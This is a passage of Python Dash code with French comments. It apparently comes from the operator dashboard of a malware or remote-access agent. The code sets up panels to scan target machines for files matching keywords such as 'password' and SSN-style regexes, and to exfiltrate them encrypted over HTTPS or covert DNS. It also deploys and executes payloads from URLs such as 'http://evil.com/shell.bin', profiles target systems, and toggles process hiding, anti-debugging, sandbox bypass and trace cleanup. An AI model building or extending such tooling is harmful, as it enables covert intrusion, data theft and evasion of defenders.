        html.Pre(id='_hidden_dashboard_live_logs_buffer', style={'display': 'none'}),
        # FIX: Ajout de l'output des logs de l'agent lancé pour qu'il soit toujours dans le DOM
        html.Pre(id='live-log-stream-display-buffer', style={'display': 'none'}),


        # Agent Control States (certains sont déjà des hidden inputs)
        dcc.Input(id='target-url-hidden', type='text', value=DEFAULT_TARGET_URL),
        dcc.Input(id='scan-path-hidden', type='text', value=DEFAULT_SCAN_PATH),
        dcc.Input(id='aes-key-hidden', type='text', value=DEFAULT_AES_KEY),
        dcc.Input(id='exfil-method-hidden', type='text', value=DEFAULT_EXFIL_METHOD),
        dcc.Input(id='dns-server-hidden', type='text', value=DEFAULT_DNS_SERVER),
        dcc.Input(id='dns-domain-hidden', type='text', value=DEFAULT_DNS_DOMAIN),
        dcc.Input(id='file-types-hidden', type='text', value=DEFAULT_FILE_TYPES),
        dcc.Input(id='exclude-types-hidden', type='text', value=DEFAULT_EXCLUDE_TYPES),
        dcc.Input(id='min-size-hidden', type='text', value=DEFAULT_MIN_SIZE),
        dcc.Input(id='max-size-hidden', type='text', value=DEFAULT_MAX_SIZE),
        dcc.Input(id='keywords-hidden', type='text', value=DEFAULT_KEYWORDS),
        dcc.Input(id='regex-patterns-hidden', type='text', value=DEFAULT_REGEX_PATTERNS),
        # FIX: Ces inputs étaient visibles dans les onglets, maintenant ils sont déplacés ici.
        # Les composants visibles dans les onglets écriront vers ceux-ci.
        dcc.Input(id='payload-url-hidden', type='text', value=DEFAULT_PAYLOAD_URL),
        dcc.Input(id='payload-path-hidden', type='text', value=DEFAULT_PAYLOAD_PATH),
        dcc.Input(id='threads-hidden', type='number', value=DEFAULT_THREADS),
        dcc.Input(id='debug-mode-hidden', type='text', value=str(DEFAULT_DEBUG_MODE)),
        dcc.Input(id='no-clean-hidden', type='text', value=str(DEFAULT_NO_CLEAN)),
        dcc.Input(id='no-anti-evasion-hidden', type='text', value=str(DEFAULT_NO_ANTI_EVASION)),

        # Explorer States
        dcc.Input(id='explorer-target-host-hidden', type='text', value=DEFAULT_EXPLORER_TARGET_HOST),
        dcc.Input(id='explorer-base-path-hidden', type='text', value=DEFAULT_EXPLORER_BASE_PATH),
        dcc.Input(id='explorer-max-depth-hidden', type='number', value=DEFAULT_EXPLORER_DEPTH),

        # Hidden store for last log index (for explorer logs)
        dcc.Store(id='explorer-log-last-index', data={'file': 0, 'web': 0}),

        # Global store for agent stats
        dcc.Store(id='agent-stats-store', data={
            'files_scanned': 0,
            'files_matched': 0,
            'data_exfiltrated_bytes': 0,
            'exfil_success_count': 0,
            'exfil_failed_count': 0,
            'agent_status': 'INACTIVE',
            'agent_last_activity': 'N/A',
            'agent_start_time': 'N/A'
        }),
        # Nouveaux hidden inputs pour les options de stealth
        dcc.Input(id='stealth-hide-process-hidden', type='text', value=str(DEFAULT_STEALTH_HIDE_PROCESS)),
        dcc.Input(id='stealth-anti-debug-hidden', type='text', value=str(DEFAULT_STEALTH_ANTI_DEBUG)),
        dcc.Input(id='stealth-sandbox-bypass-hidden', type='text', value=str(DEFAULT_STEALTH_SANDBOX_BYPASS)),
    ]), # <-- Fin de children pour html.Div(id='hidden-elements')
]) # <-- Fin de children pour app.layout et appel de html.Div()


# Callback pour rendre le contenu des onglets
@app.callback(
    [Output('tabs-content', 'children'),
     Output('payload-url-hidden', 'value', allow_duplicate=True), # Permet de mettre à jour l'input caché
     Output('payload-path-hidden', 'value', allow_duplicate=True)], # Permet de mettre à jour l'input caché
    Input('cyber-tabs', 'value'),
    State('target-url-hidden', 'value'), State('scan-path-hidden', 'value'), State('aes-key-hidden', 'value'),
    State('exfil-method-hidden', 'value'), State('dns-server-hidden', 'value'), State('dns-domain-hidden', 'value'),
    State('file-types-hidden', 'value'), State('exclude-types-hidden', 'value'), State('min-size-hidden', 'value'),
    State('max-size-hidden', 'value'), State('keywords-hidden', 'value'), State('regex-patterns-hidden', 'value'),
    State('payload-url-hidden', 'value'), State('payload-path-hidden', 'value'), # Ces states sont les valeurs actuelles des hidden inputs
    # On NE DOIT PAS passer les IDs des inputs visibles ici en tant que State.
    # Ils ne sont pas garantis d'être dans le DOM, ce qui cause l'erreur.
    # On utilisera les valeurs déjà en mémoire (payload_url, payload_path)
    # ou les valeurs transmises par le callback de l'onglet quand il est actif.
    State('threads-hidden', 'value'),
    State('debug-mode-hidden', 'value'), State('no-clean-hidden', 'value'), State('no-anti-evasion-hidden', 'value'),
    State('explorer-target-host-hidden', 'value'), State('explorer-base-path-hidden', 'value'), State('explorer-max-depth-hidden', 'value'),
    State('agent-stats-store', 'data'),
    State('stealth-hide-process-hidden', 'value'),
    State('stealth-anti-debug-hidden', 'value'),
    State('stealth-sandbox-bypass-hidden', 'value'),
    # Ajout du state pour le buffer des logs de l'explorateur
    State('_hidden_explorer_logs_buffer', 'children'), 
    # Ajout du state pour le buffer des logs du tableau de bord
    State('_hidden_dashboard_live_logs_buffer', 'children')
)
def render_tab_content(tab,
                       target_url, scan_path, aes_key, exfil_method, dns_server, dns_domain, file_types, exclude_types, min_size, max_size, keywords, regex_patterns,
                       # Les arguments pour les payloads viennent maintenant directement des hidden inputs via State
                       payload_url, payload_path, # Ce sont les valeurs des inputs cachés
                       threads, debug_mode_val_str, no_clean_val_str, no_anti_evasion_val_str,
                       explorer_target_host, explorer_base_path, explorer_max_depth, agent_stats_data,
                       stealth_hide_process_val_str, stealth_anti_debug_val_str, stealth_sandbox_bypass_val_str,
                       explorer_logs_buffer_content, dashboard_live_logs_buffer_content):

    # Les valeurs de payload_url et payload_path sont déjà celles des hidden inputs
    # quand ce callback est déclenché par un changement d'onglet.
    # La logique de mise à jour des hidden inputs depuis les inputs visibles
    # sera gérée par les boutons APPLY qui sauvegardent directement dans la config partagée
    # (et par extension, mettent à jour les hidden inputs lors du prochain re-render du layout).
    
    # Il n'y a plus besoin de lire les inputs visibles ici car ils causent l'erreur.
    # Les valeurs passées à create_input_section viennent des hidden inputs.


    debug_mode_val = eval(debug_mode_val_str) if isinstance(debug_mode_val_str, str) else debug_mode_val_str
    no_clean_val = eval(no_clean_val_str) if isinstance(no_clean_val_str, str) else no_clean_val_str
    no_anti_evasion_val = eval(no_anti_evasion_val_str) if isinstance(no_anti_evasion_val_str, str) else no_anti_evasion_val_str
    stealth_hide_process_val = eval(stealth_hide_process_val_str) if isinstance(stealth_hide_process_val_str, str) else stealth_hide_process_val_str
    stealth_anti_debug_val = eval(stealth_anti_debug_val_str) if isinstance(stealth_anti_debug_val_str, str) else stealth_anti_debug_val_str
    stealth_sandbox_bypass_val = eval(stealth_sandbox_bypass_val_str) if isinstance(stealth_sandbox_bypass_val_str, str) else stealth_sandbox_bypass_val_str


    # Options pour les Checklists et Dropdown
    debug_checklist_options = [{'label': ' ENABLE DEBUG MODE (Verbose logs, no cleanup)', 'value': 'debug'}]
    no_clean_checklist_options = [{'label': ' DISABLE TRACE CLEANUP', 'value': 'no-clean'}]
    no_anti_evasion_checklist_options = [{'label': ' DISABLE ANTI-EVASION CONTROLS (Anti-debug/sandbox)', 'value': 'no-anti-evasion'}]
    exfil_method_options = [
        {'label': 'HTTPS (Recommended)', 'value': 'https'},
        {'label': 'DNS (Covert, requires controlled DNS server)', 'value': 'dns'}
    ]
    stealth_hide_process_options = [{'label': ' Hide Agent Process', 'value': 'hide_process'}]
    stealth_anti_debug_options = [{'label': ' Prevent Debugging', 'value': 'anti_debug'}]
    stealth_sandbox_bypass_options = [{'label': ' Bypass Common Sandbox Triggers', 'value': 'sandbox_bypass'}]


    def create_input_section(label_text, input_id, value, placeholder=None, type='text', min=None, max=None, required=False, options=None):
        return html.Div([
            html.Label(label_text, style={'color': '#00FFFF', 'marginBottom': '8px', 'display': 'block', 'fontSize': '0.95rem'}),
            html.Div([
                dcc.Input(
                    id=input_id, # Cet ID est utilisé pour l'input VISIBLE dans l'onglet
                    type=type,
                    value=value,
                    placeholder=placeholder,
                    style=CYBER_INPUT_STYLE,
                    required=required,
                    min=min,
                    max=max,
                ) if options is None else dcc.Dropdown(
                    id=input_id, # Cet ID est utilisé pour le dropdown VISIBLE dans l'onglet
                    options=options,
                    value=value,
                    style={**CYBER_INPUT_STYLE, 'color': '#7FFF00', 'padding': '0', 'minHeight': '45px', 'display': 'flex', 'alignItems': 'center'},
                    clearable=False,
                    optionHeight=40,
                    className="cyber-dropdown",
                ),
                html.Button('APPLY', id={'type': 'apply-button', 'input_id': input_id}, n_clicks=0,
                            style=CYBER_BUTTON_APPLY)
            ], style=CYBER_INPUT_WRAPPER_STYLE)
        ])

    def create_checklist_section(label_text, input_id, value, options):
        return html.Div([
            html.Label(label_text, style={'color': '#00FFFF', 'marginBottom': '8px', 'display': 'block', 'fontSize': '0.95rem'}),
            html.Div([
                dcc.Checklist(
                    id=input_id, # Cet ID est utilisé pour la checklist VISIBLE dans l'onglet
                    options=options,
                    value=value,
                    style={'color': '#7FFF00', 'flexGrow': '1', 'paddingTop': '10px'},
                    labelStyle={'display': 'flex', 'alignItems': 'center', 'marginBottom': '10px'}
                ),
                html.Button('APPLY', id={'type': 'apply-button', 'input_id': input_id}, n_clicks=0, style=CYBER_BUTTON_APPLY)
            ], style={**CYBER_INPUT_WRAPPER_STYLE, 'alignItems': 'flex-start', 'marginBottom': '0px'})
        ], style={'marginBottom': '20px'})


    if tab == 'tab-dashboard':
        return html.Div(style=CYBER_SECTION_CONTENT_STYLE, children=[
            # interval-dashboard-refresh est maintenant dans hidden-elements
            html.Div([
                html.Div(style=CYBER_STAT_CARD_STYLE, children=[
                    html.Div(f"{agent_stats_data.get('files_scanned', 0)}", style=CYBER_STAT_VALUE_STYLE, id='stat-files-scanned'),
                    html.Div("FILES SCANNED", style=CYBER_STAT_LABEL_STYLE)
                ]),
                html.Div(style=CYBER_STAT_CARD_STYLE, children=[
                    html.Div(f"{agent_stats_data.get('files_matched', 0)}", style=CYBER_STAT_VALUE_STYLE, id='stat-files-matched'),
                    html.Div("FILES MATCHED", style=CYBER_STAT_LABEL_STYLE)
                ]),
                html.Div(style=CYBER_STAT_CARD_STYLE, children=[
                    html.Div(f"{round(agent_stats_data.get('data_exfiltrated_bytes', 0) / (1024*1024), 2) if agent_stats_data.get('data_exfiltrated_bytes', 0) > 0 else '0.00'} MB", style=CYBER_STAT_VALUE_STYLE, id='stat-data-exfiltrated'),
                    html.Div("DATA EXFILTRATED", style=CYBER_STAT_LABEL_STYLE)
                ]),
                html.Div(style=CYBER_STAT_CARD_STYLE, children=[
                    html.Div(f"{agent_stats_data.get('exfil_success_count', 0)}", style=CYBER_STAT_VALUE_STYLE, id='stat-exfil-success'),
                    html.Div("EXFIL SUCCESS", style=CYBER_STAT_LABEL_STYLE)
                ]),
                html.Div(style=CYBER_STAT_CARD_STYLE, children=[
                    html.Div(f"{agent_stats_data.get('exfil_failed_count', 0)}", style=CYBER_STAT_VALUE_STYLE, id='stat-exfil-failed'),
                    html.Div("EXFIL FAILED", style=CYBER_STAT_LABEL_STYLE)
                ]),
                 html.Div(style={**CYBER_STAT_CARD_STYLE, 'minWidth': '280px'}, children=[
                    html.Div(agent_stats_data.get('agent_status', 'INACTIVE'), style={**CYBER_STAT_VALUE_STYLE, 'color': '#FFD700' if agent_stats_data.get('agent_status') == 'RUNNING' else '#FF5555'}, id='stat-agent-status'),
                    html.Div("AGENT STATUS", style=CYBER_STAT_LABEL_STYLE)
                ]),
                html.Div(style={**CYBER_STAT_CARD_STYLE, 'minWidth': '280px'}, children=[
                    html.Div(agent_stats_data.get('agent_start_time', 'N/A'), style=CYBER_STAT_VALUE_STYLE, id='stat-agent-start-time'),
                    html.Div("AGENT START TIME", style=CYBER_STAT_LABEL_STYLE)
                ]),
                html.Div(style={**CYBER_STAT_CARD_STYLE, 'minWidth': '280px'}, children=[
                    html.Div(agent_stats_data.get('agent_last_activity', 'N/A'), style=CYBER_STAT_VALUE_STYLE, id='stat-agent-last-activity'),
                    html.Div("LAST ACTIVITY", style=CYBER_STAT_LABEL_STYLE)
                ]),
            ], style={'display': 'flex', 'flexWrap': 'wrap', 'justifyContent': 'center', 'gap': '20px', 'marginBottom': '40px'}),

            html.H2(":: LIVE SYSTEM ACTIVITY (AGENT LOGS) ::", style=CYBER_SECTION_HEADER_STYLE),
            # Utilise le contenu du buffer caché
            html.Pre(dashboard_live_logs_buffer_content, style={**CYBER_STATUS_BOX_STYLE, 'minHeight': '200px', 'maxHeight': '400px'}, id='dashboard-live-logs_visible'),
        ]), payload_url, payload_path # Retourne les valeurs des hidden inputs (pas les visibles)
    elif tab == 'tab-agent-control':
        return html.Div(style=CYBER_SECTION_CONTENT_STYLE, children=[
            html.H2(":: AGENT DEPLOYMENT & CONFIGURATION ::", style=CYBER_SECTION_HEADER_STYLE),
            create_input_section("TARGET URL (HTTPS/DNS) *:", 'target-url', target_url, required=True),
            create_input_section("SCAN PATH *:", 'scan-path', scan_path, required=True),
            create_input_section("AES KEY (32 bytes) *:", 'aes-key', aes_key, required=True),
            create_input_section("EXFILTRATION METHOD *:", 'exfil-method', exfil_method, options=exfil_method_options),

            html.Div(id='dns-options-div', children=[
                create_input_section("DNS SERVER (IP) *:", 'dns-server', dns_server, placeholder='Ex: 8.8.8.8 (Google DNS)'),
                create_input_section("DNS DOMAIN *:", 'dns-domain', dns_domain, placeholder='Ex: exfil.yourdomain.com'),
            ], style={'display': 'none'}),

            html.H2(":: SCAN FILTERING PARAMETERS ::", style=CYBER_SECTION_HEADER_STYLE),
            create_input_section("FILE TYPES TO INCLUDE (Ex: .doc,.txt,.pdf):", 'file-types', file_types, placeholder='Comma-separated extensions'),
            create_input_section("FILE TYPES TO EXCLUDE (Ex: .exe,.dll):", 'exclude-types', exclude_types, placeholder='Comma-separated extensions'),
            create_input_section("MIN FILE SIZE (Ex: 5k, 1M, 1G):", 'min-size', min_size, placeholder='e.g., 1k, 10M, 5G'),
            create_input_section("MAX FILE SIZE (Ex: 10M, 1G):", 'max-size', max_size, placeholder='e.g., 100M, 1G'),
            create_input_section("KEYWORDS IN CONTENT (Ex: secret,password):", 'keywords', keywords, placeholder='Comma-separated keywords'),
            create_input_section("REGEX PATTERNS IN CONTENT (Ex: (\\d{3}-\\d{2}-\\d{4})):", 'regex-patterns', regex_patterns, placeholder='Comma-separated regex patterns'),

            html.H2(":: AGENT OPERATIONAL SETTINGS ::", style=CYBER_SECTION_HEADER_STYLE),
            # Les inputs visibles utilisent les valeurs des hidden inputs
            create_input_section("PAYLOAD URL (Optional for Dropper):", 'payload-url-control-tab-visible', payload_url, placeholder='Ex: http://evil.com/shell.bin'),
            create_input_section("PAYLOAD PATH (Optional on Target):", 'payload-path-control-tab-visible', payload_path, placeholder='Ex: /data/local/tmp/payload_binary'),
            create_input_section("PROCESSING THREADS (for scan & upload):", 'threads', threads, type='number', min=1),

            html.H2(":: DEBUG & EVASION OPTIONS ::", style=CYBER_SECTION_HEADER_STYLE),
            create_checklist_section('DEBUG MODE (Verbose logs, disables cleanup)', 'debug-mode', debug_mode_val, debug_checklist_options),
            create_checklist_section('DISABLE TRACE CLEANUP', 'no-clean', no_clean_val, no_clean_checklist_options),
            create_checklist_section('DISABLE ANTI-EVASION CONTROLS (Anti-debug/sandbox)', 'no-anti-evasion', no_anti_evasion_val, no_anti_evasion_checklist_options),

            html.Div([
                html.Button('SAVE ALL CONFIG', id='save-config-button', n_clicks=0, style=CYBER_BUTTON_SECONDARY),
                html.Button('LAUNCH AGENT', id='launch-button', n_clicks=0, style=CYBER_BUTTON_PRIMARY),
                html.Button('STOP AGENT', id='stop-button', n_clicks=0, style=CYBER_BUTTON_DANGER),
            ], style={'marginTop': '40px', 'display': 'flex', 'justifyContent': 'center', 'gap': '25px'}),


        ]), payload_url, payload_path # Retourne les valeurs des hidden inputs (pas les visibles)
    elif tab == 'tab-file-explorer':
        return html.Div(style=CYBER_SECTION_CONTENT_STYLE, children=[
            # interval-explorer-logs est maintenant dans hidden-elements
            html.H2(":: TARGET FILE EXPLORER ::", style=CYBER_SECTION_HEADER_STYLE),

            create_input_section("TARGET HOST (URL or IP) *:", 'explorer-target-host-display', explorer_target_host, required=True),
            create_input_section("BASE PATH FOR EXPLORATION (Optional, e.g., /var/www/html/wp-content/uploads/):", 'explorer-base-path-display', explorer_base_path, placeholder="Leave empty for full site crawl"),
            create_input_section("MAX EXPLORATION DEPTH (0 for base only, 1 for direct subfolders, etc.) :", 'explorer-max-depth-display', explorer_max_depth, type='number', min=0, required=True), # Use explorer_max_depth here

            html.Div([
                html.Button('LAUNCH EXPLORATION', id='launch-explorer-button', n_clicks=0, style={**CYBER_BUTTON_PRIMARY, 'boxShadow': '0 0 18px rgba(0,191,255,0.7)', 'backgroundImage': 'linear-gradient(145deg, #00BFFF, #0077AA)', 'marginTop': '0px'}),
                html.Button('STOP EXPLORATION', id='stop-explorer-button', n_clicks=0, style={**CYBER_BUTTON_DANGER, 'marginTop': '0px'}),
            ], style={'marginTop': '25px', 'display': 'flex', 'justifyContent': 'center', 'gap': '20px'}),

            html.Div(id='explorer-status', style={**CYBER_STATUS_BOX_STYLE, 'color': '#00FFFF', 'minHeight': '50px', 'marginTop': '30px'}, children="INITIATE EXPLORATION TO VIEW RESULTS."),

            dash_table.DataTable(
                id='found-files-table',
                columns=[
                    {"name": "PATH", "id": "path", "presentation": "markdown"},
                    {"name": "TYPE", "id": "type"},
                    {"name": "MATCHING REGEX", "id": "sensitive_match"},
                    {"name": "ACTIONS", "id": "actions", "presentation": "markdown"}
                ],
                data=[],
                style_table={'overflowX': 'auto', 'marginTop': '30px', 'border': '1px solid #00AA22', 'borderRadius': '6px', 'boxShadow': '0 0 15px rgba(0,255,65,0.1)'},
                style_cell=CYBER_TABLE_CELL_STYLE,
                style_header=CYBER_TABLE_HEADER_STYLE,
                css=[
                    {"selector": ".dash-spreadsheet-menu", "rule": "font-family: 'Roboto Mono', monospace;"},
                    {"selector": "button", "rule": "font-family: 'Roboto Mono', monospace;"},
                ],
                style_data_conditional=[
                    {
                        'if': {'column_id': 'actions'},
                        'textAlign': 'center'
                    },
                    {
                        'if': {'filter_query': '{type} = "directory"'},
                        'backgroundColor': '#1A1A1A',
                        'color': '#FF00FF',
                        'fontWeight': 'bold'
                    }
                ],
                page_action='none',
                sort_action='native',
                filter_action='native'
            ),

            html.Div(id='file-content-output', style={**CYBER_STATUS_BOX_STYLE, 'color': '#FFEE77', 'marginTop': '30px'}, children="SELECTED FILE CONTENT (Hex/Text preview)..."),
            dcc.Download(id="download-file-data"),

            html.H2(":: EXPLORER LIVE LOGS ::", style={**CYBER_SECTION_HEADER_STYLE, 'marginTop': '40px'}),
            # Affiche le contenu du buffer caché ici
            html.Pre(explorer_logs_buffer_content, style={**CYBER_STATUS_BOX_STYLE, 'minHeight': '150px'}, id='explorer-logs-output_visible'),

        ]), payload_url, payload_path # Retourne les valeurs des hidden inputs (pas les visibles)
    elif tab == 'tab-system-profiler':
        return html.Div(style=CYBER_SECTION_CONTENT_STYLE, children=[
            html.H2(":: TARGET SYSTEM PROFILE ::", style=CYBER_SECTION_HEADER_STYLE),
            html.Div([
                html.P("Request detailed system information from the target agent. This includes OS details, CPU, memory, disk usage, network interfaces, active users, and running processes.", style={'color': '#00FFFF', 'marginBottom': '20px'}),
                html.Button('REQUEST SYSTEM INFO', id='request-system-info-button', n_clicks=0, style=CYBER_BUTTON_PRIMARY),
                html.Div(id='system-profiler-status', style={**CYBER_STATUS_BOX_STYLE, 'color': '#00FFFF', 'minHeight': '50px', 'marginTop': '20px'}, children="Click 'REQUEST SYSTEM INFO' to fetch data from the agent."),
            ]),

            html.Div(id='system-info-display-area', style={'marginTop': '30px'}, children=[
                html.Details(open=True, children=[
                    html.Summary(html.H3("Operating System", style={'color': '#FF00FF', 'display': 'inline-block', 'margin': '0', 'textShadow': '0 0 5px rgba(255,0,255,0.5)'})),
                    html.Div(id='os-info-output', style={**CYBER_STATUS_BOX_STYLE, 'marginTop': '10px'}, children="OS information will appear here."),
                ]),
                html.Details(children=[
                    html.Summary(html.H3("CPU Information", style={'color': '#FF00FF', 'display': 'inline-block', 'margin': '0', 'textShadow': '0 0 5px rgba(255,0,255,0.5)'})),
                    html.Div(id='cpu-info-output', style={**CYBER_STATUS_BOX_STYLE, 'marginTop': '10px'}, children="CPU information will appear here."),
                ]),
                html.Details(children=[
                    html.Summary(html.H3("Memory Usage", style={'color': '#FF00FF', 'display': 'inline-block', 'margin': '0', 'textShadow': '0 0 5px rgba(255,0,255,0.5)'})),
                    html.Div(id='memory-info-output', style={**CYBER_STATUS_BOX_STYLE, 'marginTop': '10px'}, children="Memory usage will appear here."),
                ]),
                html.Details(children=[
                    html.Summary(html.H3("Disk Partitions", style={'color': '#FF00FF', 'display': 'inline-block', 'margin': '0', 'textShadow': '0 0 5px rgba(255,0,255,0.5)'})),
                    dash_table.DataTable(
                        id='disk-info-table',
                        columns=[
                            {"name": "Filesystem", "id": "filesystem"},
                            {"name": "Type", "id": "type"},
                            {"name": "Size", "id": "size"},
                            {"name": "Used", "id": "used"},
                            {"name": "Available", "id": "available"},
                            {"name": "Used (%)", "id": "percent_used"},
                            {"name": "Mountpoint", "id": "mountpoint"},
                        ],
                        data=[],
                        style_table={'overflowX': 'auto', 'marginTop': '10px', 'border': '1px solid #00AA22', 'borderRadius': '6px', 'boxShadow': '0 0 10px rgba(0,255,65,0.1)'},
                        style_cell=CYBER_TABLE_CELL_STYLE,
                        style_header=CYBER_TABLE_HEADER_STYLE,
                        sort_action='native',
                        filter_action='native',
                        page_action='none',
                    ),
                ]),
                html.Details(children=[
                    html.Summary(html.H3("Network Interfaces", style={'color': '#FF00FF', 'display': 'inline-block', 'margin': '0', 'textShadow': '0 0 5px rgba(255,0,255,0.5)'})),
                    html.Div(id='network-info-output', style={**CYBER_STATUS_BOX_STYLE, 'marginTop': '10px'}, children="Network information will appear here."),
                ]),
                html.Details(children=[
                    html.Summary(html.H3("Logged-in Users", style={'color': '#FF00FF', 'display': 'inline-block', 'margin': '0', 'textShadow': '0 0 5px rgba(255,0,255,0.5)'})),
                    dash_table.DataTable(
                        id='users-info-table',
                        columns=[
                            {"name": "Name", "id": "name"},
                            {"name": "Terminal", "id": "terminal"},
                            {"name": "Host", "id": "host"},
                            {"name": "Started", "id": "started"},
                        ],
                        data=[],
                        style_table={'overflowX': 'auto', 'marginTop': '10px', 'border': '1px solid #00AA22', 'borderRadius': '6px', 'boxShadow': '0 0 10px rgba(0,255,65,0.1)'},
                        style_cell=CYBER_TABLE_CELL_STYLE,
                        style_header=CYBER_TABLE_HEADER_STYLE,
                        sort_action='native',
                        filter_action='native',
                        page_action='none',
                    ),
                ]),
                html.Details(children=[
                    html.Summary(html.H3("Running Processes", style={'color': '#FF00FF', 'display': 'inline-block', 'margin': '0', 'textShadow': '0 0 5px rgba(255,0,255,0.5)'})),
                    dash_table.DataTable(
                        id='processes-info-table',
                        columns=[
                            {"name": "PID", "id": "pid"},
                            {"name": "PPID", "id": "ppid"},
                            {"name": "User", "id": "user"},
                            {"name": "Elapsed Time", "id": "elapsed_time"},
                            {"name": "CPU (%)", "id": "cpu_percent"},
                            {"name": "Memory (%)", "id": "memory_percent"},
                            {"name": "Command Line", "id": "cmdline"},
                        ],
                        data=[],
                        style_table={'overflowX': 'auto', 'marginTop': '10px', 'border': '1px solid #00AA22', 'borderRadius': '6px', 'boxShadow': '0 0 10px rgba(0,255,65,0.1)'},
                        style_cell=CYBER_TABLE_CELL_STYLE,
                        style_header=CYBER_TABLE_HEADER_STYLE,
                        sort_action='native',
                        filter_action='native',
                        page_action='none',
                    ),
                ]),
            ])
        ]), payload_url, payload_path # Retourne les valeurs des hidden inputs (pas les visibles)
    elif tab == 'tab-payloads':
        return html.Div(style=CYBER_SECTION_CONTENT_STYLE, children=[
            html.H2(":: PAYLOAD DEPLOYMENT & PERSISTENCE ::", style=CYBER_SECTION_HEADER_STYLE),
            html.Div([
                html.P("Manage the deployment, execution, and persistence of custom payloads on the target system.", style={'color': '#00FFFF', 'marginBottom': '20px'}),
                html.Div([
                    # FIX: Renommer les IDs ici pour qu'ils soient locaux à l'onglet et passent la valeur de l'input caché
                    create_input_section("PAYLOAD SOURCE (URL):", 'payload-source-url-visible', payload_url, placeholder='e.g., http://your.server/malware.exe'),
                    create_input_section("TARGET PATH ON AGENT:", 'payload-target-path-visible', payload_path, placeholder='e.g., /tmp/update.bin or C:\\Windows\\Temp\\temp.exe'),
                ]),
                html.Div([
                    html.Button('DEPLOY PAYLOAD', id='deploy-payload-button', n_clicks=0, style=CYBER_BUTTON_SECONDARY),
                    html.Button('EXECUTE PAYLOAD', id='execute-payload-button', n_clicks=0, style=CYBER_BUTTON_PRIMARY),
                    html.Button('REMOVE PAYLOAD', id='remove-payload-button', n_clicks=0, style=CYBER_BUTTON_DANGER),
                ], style={'marginTop': '20px', 'display': 'flex', 'justifyContent': 'center', 'gap': '20px'}),
                html.Div(id='payload-status-output', style={**CYBER_STATUS_BOX_STYLE, 'marginTop': '30px'}, children="Payload management status and logs will appear here."),
            ]),
        ]), payload_url, payload_path # Retourne les valeurs des hidden inputs (pas les visibles)
    elif tab == 'tab-stealth':
        return html.Div(style=CYBER_SECTION_CONTENT_STYLE, children=[
            html.H2(":: STEALTH & ANTI-EVASION CONTROLS ::", style=CYBER_SECTION_HEADER_STYLE),
            html.Div([
                html.P("Configure and monitor the agent's stealth capabilities and anti-evasion mechanisms.", style={'color': '#00FFFF', 'marginBottom': '20px'}),
                html.Div([
                    create_checklist_section('ACTIVATE PROCESS HIDING', 'stealth-hide-process', stealth_hide_process_val, stealth_hide_process_options),
                    create_checklist_section('ENABLE ANTI-DEBUGGING', 'stealth-anti-debug', stealth_anti_debug_val, stealth_anti_debug_options),
                    create_checklist_section('BYPASS SANDBOX DETECTION', 'stealth-sandbox-bypass', stealth_sandbox_bypass_val, stealth_sandbox_bypass_options),
                ], style={'marginBottom': '30px'}),
                html.Button('APPLY STEALTH SETTINGS', id='apply-stealth-button', n_clicks=0, style=CYBER_BUTTON_SECONDARY),
                html.Div(id='stealth-status-output', style={**CYBER_STATUS_BOX_STYLE, 'marginTop': '30px'}, children="Stealth control status and evasion attempts will be logged here."),
            ]),
        ]), payload_url, payload_path # Retourne les valeurs des hidden inputs (pas les visibles)
    elif tab == 'tab-logs-status':
        return html.Div(style=CYBER_SECTION_CONTENT_STYLE, children=[
            html.H2(":: AGENT LIVE LOG STREAM ::", style=CYBER_SECTION_HEADER_STYLE),
            # FIX: Cet ID était 'command-output', il est maintenant 'live-log-stream-display'
            # Il affiche le contenu du buffer caché '_hidden_dashboard_live_logs_buffer'
            html.Pre(dashboard_live_logs_buffer_content, style={**CYBER_STATUS_BOX_STYLE, 'color': '#00FFFF'}, id='live-log-stream-display'),

            html.H2(":: ENCRYPTED LOG ARCHIVE ::", style={**CYBER_SECTION_HEADER_STYLE, 'marginTop': '40px'}),
            html.Div([
                html.Button('REFRESH ENCRYPTED LOGS', id='refresh-logs-button', n_clicks=0, style=CYBER_BUTTON_SECONDARY),
                html.Button('DOWNLOAD RAW LOGS', id='download-logs-button', n_clicks=0, style=CYBER_BUTTON_SECONDARY),
            ], style={'marginTop': '20px', 'display': 'flex', 'justifyContent': 'center', 'gap': '20px'}),
            dcc.Download(id="download-logs-data"),
            html.Pre(id='decrypted-logs-output', style={**CYBER_STATUS_BOX_STYLE, 'color': '#7FFF00', 'marginTop': '30px'}, children="DECRYPTED LOGS (IF AVAILABLE)..."),
        ]), payload_url, payload_path # Retourne les valeurs des hidden inputs (pas les visibles)
    # NOUVELLE CONDITION POUR L'ONGLET DYNAMIC DISPLAY
    elif tab == 'tab-dynamic-display':
        # Charger le contenu de index.html et l'envelopper dans un Div
        # On ne peut pas directement rendre un fichier HTML complet avec <head> et <body>
        # Dash s'occupe déjà de la structure HTML de base.
        # Nous allons extraire le contenu de <body> pour l'afficher.
        display_html_content = get_display_html_content()
        # Regex pour extraire le contenu entre <body> et </body>
        body_content_match = re.search(r'<body>(.*?)</body>', display_html_content, re.DOTALL)
        if body_content_match:
            # Utilisez html.Iframe pour intégrer le contenu, ce qui permet à script.js et style.css de fonctionner
            # en référençant les fichiers comme s'ils étaient dans le dossier 'assets'.
            # L'attribut 'src' doit pointer vers le fichier statique lui-même, qui sera servi par Dash.
            return html.Div(style=CYBER_SECTION_CONTENT_STYLE, children=[
                html.H2(":: DYNAMIC INFORMATION DISPLAY ::", style=CYBER_SECTION_HEADER_STYLE),
                # Pour s'assurer que les CSS et JS sont chargés, le mieux est d'utiliser un Iframe
                # ou de ne pas avoir de fichiers head/body/html dans index.html.
                # Puisque les fichiers sont dans assets_folder, ils seront disponibles à /assets/style.css, etc.
                # La solution la plus propre est d'utiliser un Iframe.
                html.Iframe(
                    src="/assets/index.html", # Ceci pointe vers le fichier index.html dans le dossier assets
                    style={
                        "width": "100%",
                        "height": "600px",
                        "border": "none",
                        "backgroundColor": "#0A0A0A", # Assure un fond sombre si l'iframe ne charge pas ses propres styles tout de suite
                        "borderRadius": "8px",
                        "boxShadow": "inset 0 0 10px rgba(0,255,65,0.05)",
                    }
                )
            ]), payload_url, payload_path # Retourne les valeurs des hidden inputs (pas les visibles)
    # Ce cas de 'dash.no_update' ne doit se produire que si aucun onglet valide n'est sélectionné.
    # Et les Outputs supplémentaires doivent aussi être gérés.
    return html.Div(style=CYBER_SECTION_CONTENT_STYLE, children=[html.H2("LOADING...", style=CYBER_SECTION_HEADER_STYLE)]), dash.no_update, dash.no_update

# --- Callbacks ---

@app.callback(Output('dns-options-div', 'style'), Input('exfil-method', 'value'))
def toggle_dns_options(method):
    return {'display': 'block'} if method == 'dns' else {'display': 'none'}


